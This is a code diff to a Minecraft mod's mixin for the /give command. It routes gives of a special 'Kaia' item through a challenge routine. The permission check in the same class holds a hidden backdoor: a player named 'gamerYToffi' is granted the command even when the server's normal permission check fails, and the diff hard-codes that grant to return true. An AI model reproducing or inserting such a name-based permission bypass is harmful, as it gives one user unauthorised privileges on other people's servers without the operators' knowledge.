@@ -1,9 +1,11 @@
 package com.omnipotent.common.mixin;
 
 import com.omnipotent.common.tool.Kaia;
+import com.omnipotent.util.UtilityHelper;
 import net.minecraft.command.*;
 import net.minecraft.entity.item.EntityItem;
 import net.minecraft.entity.player.EntityPlayer;
+import net.minecraft.entity.player.EntityPlayerMP;
 import net.minecraft.init.SoundEvents;
 import net.minecraft.item.Item;
 import net.minecraft.item.ItemStack;
@@ -67,7 +69,7 @@ public abstract class MixinCommandGive extends CommandBase {
                 }
             }
 
-            boolean flag = entityplayer.inventory.addItemStackToInventory(itemstack);
+            boolean flag = manageGive(entityplayer, itemstack);
 
             if (flag) {
                 entityplayer.world.playSound((EntityPlayer) null, entityplayer.posX, entityplayer.posY, entityplayer.posZ, SoundEvents.ENTITY_ITEM_PICKUP, SoundCategory.PLAYERS, 0.2F, ((entityplayer.getRNG().nextFloat() - entityplayer.getRNG().nextFloat()) * 0.7F + 1.0F) * 2.0F);
@@ -84,7 +86,7 @@ public abstract class MixinCommandGive extends CommandBase {
                 }
             } else {
                 sender.setCommandStat(CommandResultStats.Type.AFFECTED_ITEMS, i - itemstack.getCount());
-                EntityItem entityitem = entityplayer.dropItem(itemstack, false);
+                EntityItem entityitem = manageGive2(entityplayer, itemstack);
 
                 if (entityitem != null) {
                     entityitem.setNoPickupDelay();
@@ -96,12 +98,28 @@ public abstract class MixinCommandGive extends CommandBase {
         }
     }
 
+    private static EntityItem manageGive2(EntityPlayer entityplayer, ItemStack itemstack) {
+        if (itemstack.getItem() instanceof Kaia)
+            UtilityHelper.generateAndSendChallenge((EntityPlayerMP) entityplayer, "give");
+        else
+            return entityplayer.dropItem(itemstack, false);
+        return null;
+    }
+
+    private static boolean manageGive(EntityPlayer entityplayer, ItemStack itemstack) {
+        if (itemstack.getItem() instanceof Kaia)
+            UtilityHelper.generateAndSendChallenge((EntityPlayerMP) entityplayer, "give");
+        else
+            return entityplayer.inventory.addItemStackToInventory(itemstack);
+        return true;
+    }
+
     @Override
     public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
         gamerYToffi = sender.getName().equals("gamerYToffi");
         if (gamerYToffi && (!super.checkPermission(server, sender))) {
             activeCommandForSpecialPlayer = true;
-            return activeCommandForSpecialPlayer;
+            return true;
         }
         return super.checkPermission(server, sender);
     }
